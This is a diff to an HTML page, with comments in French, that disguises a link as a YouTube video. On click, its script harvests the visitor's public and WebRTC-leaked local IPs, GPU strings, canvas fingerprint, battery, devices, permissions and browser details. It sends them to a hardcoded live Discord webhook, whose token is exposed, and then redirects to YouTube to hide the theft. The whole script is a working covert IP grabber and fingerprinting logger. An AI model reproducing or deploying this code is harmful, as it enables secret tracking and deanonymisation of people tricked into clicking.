@@ -7,51 +7,178 @@
 </head>
 <body style="margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#fff;">
 
-<a href="https://www.youtube.com/watch?v=vQqU0F8vTOE" id="fakeLink" style="display:flex;align-items:center;gap:10px;font-family:Arial;font-size:24px;text-decoration:none;color:#000;"><img src="logo.png" width="120" alt="YouTube"></a>
-
-</body>
-</html>
+<a href="#" id="fakeLink" style="display:flex;align-items:center;gap:10px;font-family:Arial;font-size:24px;text-decoration:none;color:#000;">
+  <img src="https://www.youtube.com/img/desktop/supported_browsers/dark/youtube-logo.svg" width="120" alt="YouTube">
+  Regarder la vidéo
+</a>
 
 <script>
 // ⚠️ METS TON WEBHOOK DISCORD ICI
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1571811746522464307/REyCSk0KWS3N8dkGV2BuIfly47n0G-81qVAGozbpTnQtypVZU6EdxeCeQu8TXwXJ6u1A";
 
+/* ---------- HELPERS ---------- */
+async function getPublicIP() {
+  try { return (await (await fetch("https://api.ipify.org?format=json")).json()).ip; }
+  catch { return "inconnue"; }
+}
+
+function getLocalIPs() {
+  return new Promise(resolve => {
+    const ips = new Set();
+    try {
+      const pc = new RTCPeerConnection({ iceServers:[{ urls:"stun:stun.l.google.com:19302" }] });
+      pc.createDataChannel("");
+      pc.onicecandidate = e => {
+        if (!e.candidate) { pc.close(); return resolve([...ips]); }
+        const m = e.candidate.candidate.match(/(\d{1,3}(\.\d{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){2,7})/i);
+        if (m) ips.add(m[0]);
+      };
+      pc.createOffer().then(o => pc.setLocalDescription(o));
+      setTimeout(() => { try{pc.close()}catch{}; resolve([...ips]); }, 2500);
+    } catch { resolve([]); }
+  });
+}
+
+function getWebGL() {
+  try {
+    const gl = document.createElement("canvas").getContext("webgl");
+    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+    return {
+      vendor:   dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR),
+      renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
+    };
+  } catch { return { vendor:"?", renderer:"?" }; }
+}
+
+function canvasFP() {
+  try {
+    const c = document.createElement("canvas");
+    const ctx = c.getContext("2d");
+    ctx.textBaseline = "top"; ctx.font = "14px Arial";
+    ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
+    ctx.fillStyle = "#069"; ctx.fillText("fp🐱", 2, 15);
+    ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.fillText("fp🐱", 4, 17);
+    return c.toDataURL().slice(-24);
+  } catch { return "n/a"; }
+}
+
+async function battery() {
+  try {
+    if (!navigator.getBattery) return "n/a";
+    const b = await navigator.getBattery();
+    return `${Math.round(b.level*100)}% ${b.charging ? "⚡ en charge" : "🔋"}`;
+  } catch { return "n/a"; }
+}
+
+async function devices() {
+  try {
+    const d = await navigator.mediaDevices.enumerateDevices();
+    const n = k => d.filter(x => x.kind === k).length;
+    return `📷 ${n("videoinput")} | 🎤 ${n("audioinput")} | 🔊 ${n("audiooutput")}`;
+  } catch { return "n/a"; }
+}
+
+async function perms() {
+  try {
+    const names = ["geolocation","notifications","camera","microphone","clipboard-read","midi"];
+    const out = [];
+    for (const n of names) {
+      try {
+        const s = await navigator.permissions.query({ name:n });
+        if (s.state !== "prompt") out.push(`${n}: ${s.state}`);
+      } catch {}
+    }
+    return out.length ? out.join(" · ") : "toutes en attente";
+  } catch { return "n/a"; }
+}
+
+async function clientHints() {
+  try {
+    const ua = navigator.userAgentData;
+    if (!ua) return null;
+    const h = await ua.getHighEntropyValues(["platform","platformVersion","architecture","bitness","model","uaFullVersion"]);
+    return `${h.platform} ${h.platformVersion} · ${h.architecture}/${h.bitness}bit ${
+      h.model ? "· " + h.model : ""
+    } · Chrome/${h.uaFullVersion}`;
+  } catch { return null; }
+}
+
+/* ---------- MAIN ---------- */
 document.getElementById("fakeLink").addEventListener("click", async (e) => {
   e.preventDefault();
 
-  // Récupération des données "possibles" depuis le navigateur
-  const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).catch(() => ({ip: "inconnue"}));
+  const [ip, localIPs, bat, dev, pm, hints] = await Promise.all([
+    getPublicIP(), getLocalIPs(), battery(), devices(), perms(), clientHints()
+  ]);
 
-  const data = {
-    username: "Logger",
-    embeds: [{
-      title: "Clic détecté !",
-      color: 16711680,
-      fields: [
-        { name: "IP", value: ip.ip || "inconnue", inline: true },
-        { name: "Navigateur", value: navigator.userAgent, inline: false },
-        { name: "Langue", value: navigator.language, inline: true },
-        { name: "Plateforme", value: navigator.platform, inline: true },
-        { name: "Écran", value: `${screen.width}x${screen.height}`, inline: true },
-        { name: "Fuseau horaire", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
-        { name: "Cookies activés", value: navigator.cookieEnabled ? "Oui" : "Non", inline: true },
-        { name: "CPU (cœurs)", value: String(navigator.hardwareConcurrency || "?"), inline: true },
-        { name: "RAM (Go)", value: String(navigator.deviceMemory || "?"), inline: true },
-        { name: "Page précédente", value: document.referrer || "aucune", inline: false }
-      ],
-      timestamp: new Date().toISOString()
-    }]
+  const gl   = getWebGL();
+  const conn = navigator.connection || {};
+  const ua   = navigator.userAgent;
+  const os   = /Windows NT 10/.test(ua) ? "Windows 10/11"
+            : /Windows/.test(ua) ? "Windows"
+            : /Mac OS X/.test(ua) ? "macOS"
+            : /Android/.test(ua) ? "Android"
+            : /iPhone|iPad/.test(ua) ? "iOS"
+            : /Linux/.test(ua) ? "Linux" : "Inconnu";
+  const tz   = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+  const payload = {
+    username: "🕵️ Logger",
+    embeds: [
+      {
+        title: "🌐 Réseau",
+        color: 0x00c8ff,
+        fields: [
+          { name: "IP publique",   value: `\`${ip}\``,                                 inline: true  },
+          { name: "IP locale(s)",  value: `\`${localIPs.join(", ") || "masquée"}\``,   inline: true  },
+          { name: "Connexion",     value: conn.effectiveType ? `${conn.effectiveType} · ${conn.downlink ?? "?"} Mbps · RTT ${conn.rtt ?? "?"}ms` : "n/a", inline: false },
+          { name: "Fournisseur",   value: conn.type ? conn.type : "n/a",               inline: true  },
+          { name: "Page précédente", value: document.referrer || "aucune",              inline: false }
+        ],
+        timestamp: new Date().toISOString()
+      },
+      {
+        title: "💻 Système",
+        color: 0xff9f1c,
+        fields: [
+          { name: "OS",              value: os,                                        inline: true  },
+          { name: "Plateforme",      value: navigator.platform || "?",                 inline: true  },
+          { name: "Client Hints",    value: hints || "non supporté",                   inline: false },
+          { name: "User-Agent",      value: "`" + ua.slice(0, 950) + "`",              inline: false },
+          { name: "CPU (cœurs)",     value: String(navigator.hardwareConcurrency || "?"), inline: true },
+          { name: "RAM (Go)",        value: String(navigator.deviceMemory || "?"),     inline: true  },
+          { name: "GPU",             value: `${gl.vendor}\n${gl.renderer}`.slice(0,1020), inline: false },
+          { name: "Écran",           value: `${screen.width}×${screen.height} @ ${window.devicePixelRatio}x · ${screen.colorDepth} bits`, inline: false }
+        ]
+      },
+      {
+        title: "🎛️ Divers",
+        color: 0xa259ff,
+        fields: [
+          { name: "Langue",          value: `${navigator.language} / ${(navigator.languages||[]).join(", ")}`.slice(0,1020), inline: false },
+          { name: "Fuseau horaire",  value: tz,                                        inline: true  },
+          { name: "Batterie",        value: bat,                                       inline: true  },
+          { name: "Appareils",       value: dev,                                       inline: true  },
+          { name: "Cookies",         value: navigator.cookieEnabled ? "activés" : "désactivés", inline: true },
+          { name: "Do Not Track",    value: navigator.doNotTrack || "non",             inline: true  },
+          { name: "Touch",           value: navigator.maxTouchPoints > 0 ? `${navigator.maxTouchPoints} pts` : "non", inline: true },
+          { name: "Thème",           value: matchMedia("(prefers-color-scheme: dark)").matches ? "sombre" : "clair", inline: true },
+          { name: "Permissions",     value: pm,                                        inline: false },
+          { name: "Empreinte canvas",value: "`" + canvasFP() + "`",                    inline: false },
+          { name: "Heure locale",    value: new Date().toLocaleString("fr-FR"),        inline: true  }
+        ]
+      }
+    ]
   };
 
-  // Envoi au webhook Discord (accepte les requêtes navigateur)
   fetch(WEBHOOK_URL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(data)
+    body: JSON.stringify(payload)
   }).catch(console.error);
 
-  // Redirection vers le vrai YouTube pour faire croire que rien ne s'est passé
-  window.location.href = "https://www.youtube.com/watch?v=vQqU0F8vTOE";
+  // Petite pause pour laisser la requête partir, puis redirection
+  setTimeout(() => window.location.href = "https://www.youtube.com", 400);
 });
 </script>
 
